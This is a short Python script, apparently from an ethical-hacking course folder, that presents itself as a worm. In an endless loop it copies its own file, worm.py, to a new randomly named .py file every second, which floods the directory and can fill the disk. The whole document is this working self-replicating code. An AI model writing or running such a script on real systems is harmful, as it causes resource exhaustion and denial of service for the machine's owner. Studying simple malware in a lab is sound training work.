from shutil import *
from random import randint
from time import sleep

while True:
    sleep(1)
    copyfile('C:/Users/G.V Shop/PycharmProjects/Yangelixx/CEH/worm/worm.py', str(randint(1, 9999))+'.py')